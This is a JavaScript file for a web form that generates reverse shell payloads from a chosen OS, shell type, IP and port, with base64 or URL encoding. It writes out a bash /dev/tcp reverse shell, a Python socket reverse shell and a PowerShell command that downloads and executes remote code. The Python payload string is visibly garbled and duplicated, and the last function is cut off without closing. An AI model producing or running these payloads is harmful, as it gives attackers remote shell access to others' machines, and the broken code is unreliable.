const form = document.getElementById("reverseShellForm");
const osSelect = document.getElementById("os");
const shellTypeSelect = document.getElementById("shellType");
const ipInput = document.getElementById("ip");
const portInput = document.getElementById("port");
const encodingSelect = document.getElementById("encoding");
const preview = document.getElementById("preview");

form.addEventListener("submit", function (e) {
  e.preventDefault();

  const osValue = osSelect.value;
  const shellTypeValue = shellTypeSelect.value;
  const ipValue = ipInput.value;
  const portValue = portInput.value;
  const encodingValue = encodingSelect.value;

  let payload;

  if (encodingValue === "base64") {
    payload = base64EncodeReverseShell(osValue, shellTypeValue, ipValue, 
portValue);
  } else {
    payload = urlEncodeReverseShell(osValue, shellTypeValue, ipValue, 
portValue);
  }

  preview.innerHTML = payload;
});

function base64EncodeReverseShell(os, shellType, ip, port) {
  const payload = generatePayload(os, shellType, ip, port);
  return btoa(payload);
}

function urlEncodeReverseShell(os, shellType, ip, port) {
  const encodedPayload = encodeURIComponent(generatePayload(os, shellType, ip, 
port));
  return `data:text/plain;charset=utf-8,${encodedPayload}`;
}

function generatePayload(os, shellType, ip, port) {
  let payload = "";

  if (os === "Linux") {
    if (shellType === "bash") {
      payload += `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
    } else if (shellType === "Python") {
      payload += `python3 -c 'import 
socket,subprocess,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connsocket,subprocess,sys;s=socket.socket(sockt.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",int(${port})));[print(f"%s",x) for x in sys.stdin]\
                  ;subprocess.call(["/bin/sh","-i"])'`;
    }
  } else if (os === "Windows") {
    if (shellType === "PowerShell") {
      payload += `powershell -c IEX (New-Object 
Net.WebClient).DownloadString('http://${ip}:${port}/')`;
    }
  }

  return payload;
